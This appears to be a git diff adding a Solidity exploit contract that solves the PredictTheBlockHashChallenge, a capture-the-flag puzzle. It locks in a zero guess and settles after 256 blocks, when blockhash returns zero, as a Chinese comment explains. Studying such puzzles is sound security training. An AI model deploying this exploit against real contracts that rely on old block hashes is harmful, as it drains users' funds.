@@ -35,3 +35,23 @@ contract PredictTheBlockHashChallenge {
     }
 }
 /*blockhash 方法只能得到255个区块的hash 当超过255个后 blockhash方法只能返回0 */
+contract attack{
+   PredictTheBlockHashChallenge traget;
+     uint256 num;
+bytes32 public answer=bytes32(0);
+constructor (address add) public
+{
+  traget = PredictTheBlockHashChallenge(add);
+}
+    function att1() public payable
+    {
+      num = block.number + 1;
+      traget.lockInGuess.value(1 ether)(answer);
+    }
+    function att2() public payable
+    {
+      require(block.number-256>num);
+      traget.settle();
+    }
+    function() external payable{}
+}
